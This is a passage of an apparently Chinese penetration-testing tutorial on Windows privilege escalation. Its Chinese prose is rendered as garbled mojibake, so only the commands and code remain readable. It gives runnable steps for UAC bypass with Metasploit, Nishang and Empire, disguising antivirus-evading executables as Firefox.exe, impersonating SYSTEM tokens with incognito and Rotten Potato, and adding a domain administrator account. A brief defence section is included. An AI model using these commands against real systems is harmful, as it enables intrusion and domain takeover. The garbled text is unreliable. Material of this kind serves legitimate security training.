<li>ä»ä¸æç¤ºï¼šå½“ç”¨æˆ·ä¸ºç³»ç»Ÿç®¡ç†å‘˜æ—¶ï¼Œæ‰€æœ‰ç¨‹åºéƒ½ä¼šä»¥æœ€é«˜æƒé™è¿è¡Œã€‚</li>
</ul>
<h3 id="4-4-2-BypassUAC-æ¨¡å—"><a href="#4-4-2-BypassUAC-æ¨¡å—" class="headerlink" title="4.4.2 BypassUAC æ¨¡å—"></a>4.4.2 <code>BypassUAC</code> æ¨¡å—</h3><p>â€‹        åœ¨ä½¿ç”¨<code>bypassuac</code>æ¨¡å—è¿›è¡Œææƒæ—¶ï¼Œå½“å‰ç”¨æˆ·å¿…é¡»åœ¨<strong>ç®¡ç†å‘˜ç»„ä¸­</strong>ï¼Œä¸”<code>UAC</code>å¿…é¡»ä¸ºé»˜è®¤è®¾ç½®ï¼ˆå³â€œä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘â€)ã€‚å½“<code>bypassuac</code>æ¨¡å—è¿è¡Œæ—¶,ä¼šåœ¨ç›®æ ‡æœºå™¨ä¸Šåˆ›å»ºå¤šä¸ªæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¼šè¢«æ€æ¯’è½¯ä»¶è¯†åˆ«ã€‚ä½†å› ä¸º <code>exploit/windows/local/bypassuac_injection</code>æ¨¡å—ç›´æ¥è¿è¡Œåœ¨å†…å­˜çš„åå°„<code>DLL</code>ä¸­(æ­¤æ¨¡å—é€šè¿‡å†…å­˜æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»çš„å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡UACï¼ˆè¯¥æ¨¡å—éœ€è¦é€‰æ‹©æ­£ç¡®çš„ä½“ç³»æ¶æ„ï¼‰)ï¼Œæ‰€ä»¥ä¸ä¼šæ¥è§¦ç›®æ ‡æœºå™¨çš„ç¡¬ç›˜ï¼Œä»è€Œé™ä½äº†è¢«æ€æ¯’è½¯ä»¶æ£€æµ‹å‡ºæ¥çš„æ¦‚ç‡ã€‚<code>Metasploit</code>æ¡†æ¶æ²¡æœ‰æä¾›é’ˆå¯¹<code>Windows 8</code>çš„æ¸—é€æµ‹è¯•æ¨¡å—ã€‚</p>
<p><strong>åŸç†ï¼š</strong>æ­¤æ¨¡å—é€šè¿‡è¿›ç¨‹æ³¨å…¥è·å¾—è¯ä¹¦ï¼Œå¹¶åˆ©ç”¨å—ä¿¡ä»»çš„å‘å¸ƒæœåŠ¡å™¨ç»•è¿‡<code>Windows UAC</code> ã€‚</p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ä½¿ç”¨injectionæ¨¡å—</span>
use exploit/windows/local/bypassuac_injection
<span class="hljs-meta">#</span><span class="bash"> ä¸è®¾ç½®çš„è¯ä¼šæŠ¥é”™ï¼Œæ‰§è¡Œä¸æˆåŠŸ</span>
set payload windows/x64/meterpreter/reverse_tcp
<span class="hljs-meta">#</span><span class="bash"> è®¾ç½®ç›®æ ‡ç³»ç»Ÿæ¶æ„</span>
set target 1
set session 1</code></pre>

<p><code>bypassuac_injection</code> æ¨¡å—æ”¯æŒ<code>x86</code>å’Œ<code>x64</code>ç‰ˆæœ¬çš„<code>Windows 8ã€8.1ã€10_1511ã€10_1607ã€10_1703</code>ã€‚å¦‚æœä¸è®¾ç½®<code>payload</code>ä¼šæŠ¥é”™å¦‚ä¸‹ï¼š<code>Exploit aborted due to failure: bad-config: x86 Target Selected for x64 System</code>ï¼Œå…¶å®æ¶æ„é€‰æ‹©æ²¡é—®é¢˜ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130104541567.png" alt="image-20220130104541567"></p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130104631279.png" alt="image-20220130104631279"></p>
<p>ææƒå¯¹æ¯”ï¼š</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130104717878.png" alt="image-20220130104717878"></p>
<h3 id="4-4-3-RunAs-æ¨¡å—"><a href="#4-4-3-RunAs-æ¨¡å—" class="headerlink" title="4.4.3 RunAs æ¨¡å—"></a>4.4.3 <code>RunAs</code> æ¨¡å—</h3><p><strong>å‰æï¼š</strong>è¦æƒ³ä½¿ç”¨ <code>RunAs</code>æ¨¡å—è¿›è¡Œææƒï¼Œå½“å‰ç”¨æˆ·å¿…é¡»åœ¨ç®¡ç†å‘˜ç»„ä¸­æˆ–è€…çŸ¥é“ç®¡ç†å‘˜çš„å¯†ç ï¼Œå¯¹<code>UAC</code> çš„è®¾ç½®åˆ™æ²¡æœ‰è¦æ±‚ã€‚</p>
<p><strong>åŸç†ï¼š</strong><code>This module will attempt to elevate execution level using the ShellExecute undocumented RunAs flag to bypass low UAC settings.</code></p>
<p>ä½¿ç”¨<code>exploit/windows/local/ask</code>æ¨¡å—ï¼Œåˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç›®æ ‡æœºå™¨ä¼šè¿è¡Œä¸€ä¸ªå‘èµ·æå‡æƒé™è¯·æ±‚çš„ç¨‹åºï¼ˆä½ç½®ï¼š<code>C:\Users\ç”¨æˆ·å\AppData\Local\Temp\MdIXXegVjPf.exe</code>ï¼‰ï¼Œ<strong>æç¤ºç”¨æˆ·æ˜¯å¦è¦ç»§ç»­è¿è¡Œ</strong>ï¼Œå¦‚æœç”¨æˆ·é€‰æ‹©ç»§ç»­è¿è¡Œç¨‹åºï¼Œå°±ä¼šè¿”å›ä¸€ä¸ªé«˜æƒé™çš„<code>meterpreter Shell</code>ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220129151122852.png" alt="image-20220129151122852"></p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220129154355514.png" alt="image-20220129154355514"></p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220129160202411.png" alt="image-20220129160202411"></p>
<p><code>session 6</code>æ˜¯è¿”å›é«˜æƒé™çš„<code>shell</code>ï¼Œä½¿ç”¨<code>getsystem</code>å³å¯è·å–æœ€é«˜æƒé™ï¼Œå¯ä»¥å¯¹æ¯”<code>session 5</code>æ­£å¸¸è·å–çš„<code>shell</code>æ˜¯è·å–ä¸åˆ°<code>system</code>æƒé™çš„ã€‚</p>
<p><strong>è¦ç‚¹</strong>ï¼š</p>
<ol>
<li>åœ¨ä½¿ç”¨ <code>RunAs</code> æ¨¡å—æ—¶ï¼Œéœ€è¦ä½¿ç”¨ <code>EXE::Custom</code> é€‰é¡¹åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆéœ€è¿›è¡Œå…æ€å¤„ç†ï¼‰ã€‚</li>
<li>éšæœºçš„å‘½åå¯èƒ½ä¼šå¼•èµ·æ€€ç–‘ï¼Œå¯ä»¥è®¾ç½®ä¸º<code>Firefox.exeï¼ŒChrome.exeï¼ŒWindowsUpdate.exe</code>ä¹‹ç±»çš„ã€‚</li>
</ol>
<pre><code class="hljs shell">set filename Firefox.exe
set path C:\\Users\\test\\Desktop
set exe::custom /root/miansha.exe</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220129162432447.png" alt="image-20220129162432447"></p>
<h3 id="4-4-4-Nishang-ä¸­çš„Invoke-PsUACme"><a href="#4-4-4-Nishang-ä¸­çš„Invoke-PsUACme" class="headerlink" title="4.4.4 Nishang ä¸­çš„Invoke-PsUACme"></a>4.4.4 <code>Nishang</code> ä¸­çš„<code>Invoke-PsUACme</code></h3><p><code>Invoke-PsUACme</code> æ¨¡å—ä½¿ç”¨æ¥è‡ª<code>UACME</code>é¡¹ç›®çš„<code>DLL</code>ç»•è¿‡<code>UAC</code>ã€‚å½±åƒç‰ˆæœ¬æ¶‰åŠ<code>Windows 7/2008/8/2012/Vista X86/64</code>ç‰ˆæœ¬ã€‚<code>Win 10</code>è‡ªå¸¦çš„<code>wsua</code>ç¨‹åºç”±äºä¸å†æ”¯æŒ<code>/extract</code>é‡Šæ”¾å‘½ä»¤äº†ï¼Œæ•…ä¸å†é€‚ç”¨ã€‚repo:<a target="_blank" rel="noopener" href="https://github.com/dowdyph0/UACME">https://github.com/dowdyph0/UACME</a></p>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<pre><code class="hljs powershell"><span class="hljs-comment"># ä½¿ç”¨ Sysprepæ–¹æ³•å¹¶æ‰§è¡Œé»˜è®¤çš„ Payload</span>
powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -Verbose&#125;&quot;</span>
<span class="hljs-comment"># ä½¿ç”¨oobeæ–¹æ³•å¹¶æ‰§è¡Œé»˜è®¤çš„Payload</span>
powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -method oobe -Verbose&#125;&quot;</span>
<span class="hljs-comment"># ä½¿ç”¨-Payloadå‚æ•°ï¼Œå¯ä»¥è‡ªè¡ŒæŒ‡å®šè¦æ‰§è¡Œçš„ Payload</span>
powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -method oobe -Payload &#x27;powershell -windowstyle hidden -e YourEncodedPayload&#x27;&#125;&quot;</span>
</code></pre>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><p><code>Payload</code>          è¦<code>bypass</code>çš„è½½è·</p>
</li>
<li><p><code>method</code>            <code>bypass</code>æ‰€ä½¿ç”¨çš„æ–¹æ³•ï¼Œé»˜è®¤æ˜¯<code>sysprep</code></p>
</li>
<li><p><code>PayloadPath</code>  æŒ‡å®š <code>Payload</code> çš„è·¯å¾„ã€‚</p>
</li>
<li><p><code>CustomD1164</code>ï¼ˆ64ä½ï¼‰å¯ä»¥è‡ªå®šä¹‰64ä½<code>DLL</code>æ–‡ä»¶</p>
</li>
<li><p><code>CustomDLL32</code>ï¼ˆ32ä½ï¼‰å¯ä»¥è‡ªå®šä¹‰32ä½<code>DLL</code>æ–‡ä»¶</p>
</li>
<li><p><code>$DllBytes64</code>   è„šæœ¬ä¸­ç¡¬ç¼–ç çš„é»˜è®¤ 64 ä½<code> DLL</code></p>
</li>
<li><p><code>$DllBytes32</code>   è„šæœ¬ä¸­ç¡¬ç¼–ç çš„é»˜è®¤ 32 ä½<code> DLL</code></p>
</li>
</ul>
<p>é™¤äº†ä¸Šè¿°è¯´çš„<code>sysprep</code>æ–¹æ³•ï¼Œè¿˜æœ‰ä»¥ä¸‹æ–¹æ³•ï¼š<code>sysprepã€oobeã€ActionQueueã€migwizã€cliconfgã€winsatã€mmc</code>ã€‚</p>
<p>æ­£å¸¸æƒ…å†µä¸‹<code>whoami /all</code>ï¼š</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130144842084.png" alt="image-20220130144842084"></p>
<p>ææƒæˆåŠŸè¿è¡Œç»“æœ:</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130144915465.png" alt="image-20220130144915465"></p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130144939493.png" alt="image-20220130144939493"></p>
<h3 id="4-4-5-Empire-ä¸­çš„-BypassUACæ¨¡å—"><a href="#4-4-5-Empire-ä¸­çš„-BypassUACæ¨¡å—" class="headerlink" title="4.4.5 Empire ä¸­çš„ BypassUACæ¨¡å—"></a>4.4.5 <code>Empire</code> ä¸­çš„ <code>BypassUAC</code>æ¨¡å—</h3><h5 id="1-bypassuac"><a href="#1-bypassuac" class="headerlink" title="1. bypassuac"></a>1. <code>bypassuac</code></h5><p>â€‹        åœ¨ <code>Empire </code>ä¸­è¾“å…¥<code>usemodule powershell/privesc/bypassuac</code>å‘½ä»¤ï¼Œè®¾ç½®ç›‘å¬å™¨çš„å‚æ•°ã€‚æ‰§è¡Œ<code>execute</code><br>å‘½ä»¤ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„åå¼¹ <code>Shell</code>ï¼Œå¸¦æ˜Ÿå·çš„ <code>agents</code>å°±æ˜¯ææƒæˆåŠŸ:</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131170622961.png" alt="image-20220131170622961"></p>
<h5 id="2-bypassuac-wscript"><a href="#2-bypassuac-wscript" class="headerlink" title="2. bypassuac_wscript"></a>2. <code>bypassuac_wscript</code></h5><p>â€‹        è¯¥æ¨¡å—çš„å¤§è‡´å·¥ä½œåŸç†æ˜¯ï¼Œä½¿ç”¨<code>C:\Windows\wscript.exe</code> æ‰§è¡Œ<code>Payload</code>ï¼Œå³ç»•è¿‡<code>UAC</code>ï¼Œä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œ<code>Payload</code>ã€‚è¯¥æ¨¡å—åªé€‚ç”¨äºæ“ä½œç³»ç»Ÿä¸º<code>Windows7</code>çš„æœºå™¨ï¼Œå°šæ²¡æœ‰å¯¹åº”çš„è¡¥ä¸ï¼Œéƒ¨åˆ†æ€æ¯’è½¯ä»¶ä¼šå¯¹è¯¥æ¨¡å—çš„è¿è¡Œè¿›è¡Œæç¤ºã€‚</p>
<pre><code class="hljs powershell">interact <span class="hljs-number">42</span>NUDT5B
usemodule privesc/bypassuac_wscript
<span class="hljs-built_in">set</span> Listener test
run</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131195208479.png" alt="image-20220131195208479"></p>
<h3 id="4-4-6-é’ˆå¯¹UACææƒçš„é˜²å¾¡åˆ†æ"><a href="#4-4-6-é’ˆå¯¹UACææƒçš„é˜²å¾¡åˆ†æ" class="headerlink" title="4.4.6 é’ˆå¯¹UACææƒçš„é˜²å¾¡åˆ†æ"></a>4.4.6 é’ˆå¯¹<code>UAC</code>ææƒçš„é˜²å¾¡åˆ†æ</h3><p>â€‹        åœ¨ä¼ä¸šç½‘ç»œç¯å¢ƒä¸­ï¼Œé˜²æ­¢ç»•è¿‡ <code>UAC</code> çš„æœ€å¥½çš„æ–¹æ³•æ˜¯<strong>ä¸è®©å†…ç½‘æœºå™¨çš„ä½¿ç”¨è€…æ‹¥æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™</strong>ï¼Œä»è€Œé™ä½ç³»ç»Ÿé­å—æ”»å‡»çš„å¯èƒ½æ€§ã€‚åœ¨å®¶åº­ç½‘ç»œç¯å¢ƒä¸­ï¼Œå»ºè®®ä½¿ç”¨<strong>éç®¡ç†å‘˜æƒé™</strong>è¿›è¡Œæ—¥å¸¸åŠå…¬å’Œå¨±ä¹ç­‰æ´»åŠ¨ã€‚ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜æƒé™ç™»å½•çš„ç”¨æˆ·ï¼Œè¦å°† <code>UAC</code> è®¾ç½®ä¸ºâ€œå§‹ç»ˆé€šçŸ¥â€æˆ–è€…åˆ é™¤è¯¥ç”¨æˆ·çš„æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼ˆè¿™æ ·è®¾ç½®åï¼Œä¼šåƒåœ¨<code>Windows Vista</code> ä¸­ä¸€æ ·ï¼Œæ€»æ˜¯å¼¹å‡ºè­¦å‘Šï¼‰ã€‚å¦å¤–ï¼Œå¯ä»¥ä½¿ç”¨å¾®è½¯çš„<code>EMET</code>æˆ–<code>MalwareBytes</code>æ¥æ›´å¥½åœ°é˜²èŒƒ<code>0day</code>æ¼æ´ã€‚</p>
<p>â€‹        å¯¹äº<code>DLL</code>åŠ«æŒ<code>BypassUAC</code>æ¥è¯´ï¼Œå¯ä»¥é‡å‘½åæˆ–åˆ é™¤<code>Mcx2Prov.exeã€ sysprep.exeã€ cliconfg.exeã€pwcreator.exe</code> ç­‰å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p>
<h2 id="4-5-ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ"><a href="#4-5-ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ" class="headerlink" title="4.5 ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ"></a>4.5 ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ</h2><p>â€‹        ä»¤ç‰Œï¼ˆ<code>Token</code>ï¼‰æ˜¯æŒ‡ç³»ç»Ÿä¸­çš„ä¸´æ—¶å¯†é’¥ï¼Œç›¸å½“äºè´¦æˆ·å’Œå¯†ç ï¼Œç”¨äºå†³å®šæ˜¯å¦å…è®¸å½“å‰è¯·æ±‚åŠåˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å±äºå“ªä¸ªç”¨æˆ·çš„ã€‚è·å¾—äº†ä»¤ç‰Œï¼Œå°±å¯ä»¥åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„æƒ…å†µä¸‹è®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºã€‚è¿™äº›ä»¤ç‰Œå°†æŒç»­å­˜åœ¨äºç³»ç»Ÿä¸­ï¼ˆé™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨ï¼‰ã€‚</p>
<p>â€‹        ä»¤ç‰Œçš„æœ€å¤§ç‰¹ç‚¹æ˜¯éšæœºæ€§å’Œä¸å¯é¢„æµ‹æ€§ã€‚ä¸€èˆ¬çš„æ”»å‡»è€…æˆ–è½¯ä»¶éƒ½æ— æ³•å°†ä»¤ç‰ŒçŒœæµ‹å‡ºæ¥ã€‚è®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰ä»£è¡¨è®¿é—®æ§åˆ¶æ“ä½œä¸»ä½“çš„ç³»ç»Ÿå¯¹è±¡ã€‚å¯†ä¿ä»¤ç‰Œï¼ˆ<code>Security Tolten</code>ï¼‰ä¹Ÿå«ä½œè®¤è¯ä»¤ç‰Œæˆ–è€…ç¡¬ä»¶ä»¤ç‰Œï¼Œæ˜¯ä¸€ç§ç”¨äºå®ç°è®¡ç®—æœºèº«ä»½æ ¡éªŒçš„ç‰©ç†è®¾å¤‡ï¼Œä¾‹å¦‚Uç›¾ã€‚ä¼šè¯ä»¤ç‰Œï¼ˆSession Tokenï¼‰æ˜¯äº¤äº’ä¼šè¯ä¸­å”¯ä¸€çš„èº«ä»½æ ‡è¯†ç¬¦ã€‚</p>
<p>â€‹        ä¼ªé€ ä»¤ç‰Œæ”»å‡»çš„æ ¸å¿ƒæ˜¯<code>Kerberos</code>åè®®ã€‚<code>Kerberos</code>æ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œå…¶è®¾è®¡ç›®æ ‡æ˜¯é€šè¿‡å¯†é’¥ç³»ç»Ÿä¸ºå®¢æˆ·æœº/æœåŠ¡å™¨åº”ç”¨ç¨‹åºæä¾›å¼ºå¤§çš„è®¤è¯æœåŠ¡ã€‚<code>Kerberos</code> åè®®çš„å·¥ä½œæœºåˆ¶å¦‚ä¸‹:</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131185944615.png" alt="image-20220131185944615"></p>
<p>å®¢æˆ·ç«¯è¯·æ±‚è¯ä¹¦çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯å‘è®¤è¯æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè¦æ±‚å¾—åˆ°è¯ä¹¦ã€‚</li>
<li>è®¤è¯æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œå°†åŒ…å«å®¢æˆ·ç«¯å¯†é’¥çš„åŠ å¯†è¯ä¹¦å‘é€ç»™å®¢æˆ·ç«¯ã€‚è¯¥è¯ä¹¦åŒ…å«æœåŠ¡å™¨<br>Ticketï¼ˆåŒ…å«ç”±æœåŠ¡å™¨å¯†é’¥åŠ å¯†çš„å®¢æˆ·æœºèº«ä»½å’Œä¸€ä»½ä¼šè¯å¯†é’¥ï¼‰å’Œä¸€ä¸ªä¸´æ—¶åŠ å¯†å¯†é’¥ï¼ˆåˆç§°ä¸ºä¼šè¯<br>å¯†é’¥ï¼ŒSession Key )ã€‚å½“ç„¶ï¼Œè®¤è¯æœåŠ¡å™¨ä¹Ÿä¼šå‘æœåŠ¡å™¨å‘é€ä¸€ä»½è¯¥è¯ä¹¦ï¼Œä½¿æœåŠ¡å™¨èƒ½å¤ŸéªŒè¯ç™»å½•çš„<br>å®¢æˆ·ç«¯çš„èº«ä»½ã€‚</li>
<li>å®¢æˆ·ç«¯å°† Ticket ä¼ é€ç»™æœåŠ¡å™¨ã€‚å¦‚æœæœåŠ¡å™¨ç¡®è®¤è¯¥å®¢æˆ·ç«¯çš„èº«ä»½ï¼Œå°±å…è®¸å®ƒç™»å½•æœåŠ¡å™¨ã€‚<br>å®¢æˆ·ç«¯ç™»å½•æœåŠ¡å™¨åï¼Œæ”»å‡»è€…å°±èƒ½é€šè¿‡äººä¾µæœåŠ¡å™¨æ¥çªƒå–å®¢æˆ·ç«¯çš„ä»¤ç‰Œã€‚</li>
</ol>
<h3 id="4-5-1-ä»¤ç‰Œçªƒå–"><a href="#4-5-1-ä»¤ç‰Œçªƒå–" class="headerlink" title="4.5.1 ä»¤ç‰Œçªƒå–"></a>4.5.1 ä»¤ç‰Œçªƒå–</h3><p>â€‹        å‡è®¾å·²ç»è·å¾—äº†ç›®æ ‡æœºå™¨çš„ <code>meterpreter Shell</code>ã€‚é¦–å…ˆè¾“å…¥<code>use incognito</code>å‘½ä»¤ï¼Œç„¶åè¾“å…¥<br><code>list_tokens -u</code>å‘½ä»¤ï¼Œåˆ—å‡ºå¯ç”¨çš„ä»¤ç‰Œï¼š</p>
<p><code>Windows</code>æœ‰ä¸¤ç§ç±»å‹çš„ä»¤ç‰Œï¼š</p>
<ul>
<li><p><code>Delegation Tokens</code></p>
<p>æˆæƒä»¤ç‰Œï¼Œå®ƒæ”¯æŒäº¤äº’å¼ç™»å½•ï¼ˆä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡è¿œç¨‹æ¡Œé¢ç™»å½•åŠè®¿é—®ï¼‰ï¼›</p>
</li>
<li><p><code>Impersonation Tokens</code></p>
<p>æ¨¡æ‹Ÿä»¤ç‰Œï¼Œå®ƒæ”¯æŒéäº¤äº’å¼çš„ä¼šè¯ã€‚</p>
</li>
</ul>
<p>ä»¤ç‰Œçš„æ•°é‡å…¶å®å–å†³äº <code>meterpreter Shell</code>çš„è®¿é—®çº§åˆ«ã€‚å‡è®¾å·²ç»è·å¾—äº†ä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜çš„æˆæƒä»¤ç‰Œï¼Œå¦‚æœæ”»å‡»è€…å¯ä»¥ä¼ªé€ è¿™ä¸ªä»¤ç‰Œï¼Œä¾¿å¯ä»¥æ‹¥æœ‰å®ƒçš„æƒé™ã€‚ä¸¤ç§<code>token</code>åªåœ¨<strong>ç³»ç»Ÿé‡å¯åæ¸…é™¤</strong>ï¼Œå…·æœ‰<code>Delegation token</code>çš„ç”¨æˆ·åœ¨æ³¨é”€åï¼Œè¯¥<code>Token</code>å°†å˜æˆ<code>Impersonation token</code>ï¼Œä¾æ—§æœ‰æ•ˆã€‚</p>
<p>æ³¨æ„ï¼šåœ¨è¾“äºº<code>ä¸»æœºåï¼¼ç”¨æˆ·å</code>æ—¶ï¼Œéœ€è¦è¾“äººä¸¤ä¸ªåæ–œæ <code>\\</code>ã€‚</p>
<pre><code class="hljs plaintext"># é¦–å…ˆè¦ææƒ
use exploit/windows/local/bypassuac
set session 2
run
# åŠ è½½ä¼ªè£…æ¨¡å—
use incognito
# åˆ—å‡ºå¯ç”¨ä»¤ç‰Œ
list_tokens -u
# æ¢å¤æƒé™
rev2self</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131223826391.png" alt="image-20220131223826391"></p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131223846568.png" alt="image-20220131223846568"></p>
<h3 id="4-5-2-Rotten-Potato-æœ¬åœ°ææƒåˆ†æ"><a href="#4-5-2-Rotten-Potato-æœ¬åœ°ææƒåˆ†æ" class="headerlink" title="4.5.2 Rotten Potato æœ¬åœ°ææƒåˆ†æ"></a>4.5.2 <code>Rotten Potato</code> æœ¬åœ°ææƒåˆ†æ</h3><p>å¦‚æœç›®æ ‡ç³»ç»Ÿä¸­å­˜åœ¨æœ‰æ•ˆçš„ä»¤ç‰Œï¼Œå¯ä»¥é€šè¿‡<code>Rotten Potato</code> ç¨‹åºå¿«é€Ÿæ¨¡æ‹Ÿç”¨æˆ·ä»¤ç‰Œæ¥å®ç°æƒé™çš„æå‡ã€‚</p>
<p>repoï¼š<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> åŠ è½½æ¨¡å—</span>
use incognito
<span class="hljs-meta">#</span><span class="bash"> åˆ—å‡ºå¯ç”¨ä»¤ç‰Œ</span>
list_tokens -u
<span class="hljs-meta">#</span><span class="bash"> ä¸Šä¼ çƒ‚åœŸè±†</span>
upload /root/RottenPotato/rottenpotato.exe
<span class="hljs-meta">#</span><span class="bash"> æ‰§è¡Œ</span>
execuce -HC -f rottenpotato.exe 
<span class="hljs-meta">#</span><span class="bash"> çªƒå–token</span>
impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code></pre>

<h3 id="4-5-3-æ·»åŠ åŸŸç®¡ç†å‘˜"><a href="#4-5-3-æ·»åŠ åŸŸç®¡ç†å‘˜" class="headerlink" title="4.5.3 æ·»åŠ åŸŸç®¡ç†å‘˜"></a>4.5.3 æ·»åŠ åŸŸç®¡ç†å‘˜</h3><p>â€‹        å‡è®¾ç½‘ç»œä¸­è®¾ç½®äº†åŸŸç®¡ç†è¿›ç¨‹ï¼Œåœ¨ <code>meterpreter</code> ä¼šè¯çª—å£ä¸­è¾“äºº<code>ps</code>å‘½ä»¤ï¼ŒæŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹ã€‚æ‰¾åˆ°åŸŸç®¡ç†è¿›ç¨‹ï¼Œå¹¶ä½¿ç”¨<code>migrate</code> å‘½ä»¤è¿ç§»åˆ°è¯¥è¿›ç¨‹ã€‚åœ¨ <code>meterpreter</code> æ§åˆ¶å°ä¸­è¾“å…¥<code>shell</code>ï¼Œè¿›å…¥å‘½ä»¤è¡Œç•Œé¢ã€‚è¾“å…¥å¦‚ä¸‹å‘½ä»¤:</p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„è¿›ç¨‹</span>
ps
<span class="hljs-meta">#</span><span class="bash"> è¿ç§»è¿›ç¨‹</span>
migrate &lt;åŸŸç®¡ç†å‘˜è¿›ç¨‹&gt;
<span class="hljs-meta">#</span><span class="bash"> æ·»åŠ åŸŸç”¨æˆ·</span>
net user test01 qqq@111 /add /domain
<span class="hljs-meta">#</span><span class="bash"> æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„</span>
net group &quot;domain admins&quot; test01 /add /domain
<span class="hljs-meta">#</span><span class="bash"> æŸ¥çœ‹åŸŸç®¡ç†å‘˜</span>
net group &quot;domain admins&quot; /domain</code></pre>

<p>åŒæ ·ï¼Œåœ¨ <code>meterpreter</code>ä¸­å¯ä»¥ä½¿ç”¨ <code>incognito</code> æ¥æ¨¡æ‹ŸåŸŸç®¡ç†å‘˜ï¼Œç„¶åé€šè¿‡è¿­ä»£ç³»ç»Ÿä¸­æ‰€æœ‰å¯ç”¨çš„èº«ä»½éªŒè¯ä»¤ç‰Œæ¥æ·»åŠ åŸŸç®¡ç†å‘˜ã€‚åœ¨æ´»åŠ¨çš„ <code>meterpreter</code> ä¼šè¯ä¸­æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œåœ¨åŸŸæ§ä¸»æœºä¸Šæ·»åŠ ä¸€ä¸ªè´¦æˆ·ã€‚</p>
<pre><code class="hljs powershell">add_user test01 qqq@<span class="hljs-number">111</span>  <span class="hljs-literal">-h</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.26</span>
add_group_user <span class="hljs-string">&quot;Domain Admins&quot;</span> test01 <span class="hljs-literal">-h</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.26</span></code></pre>



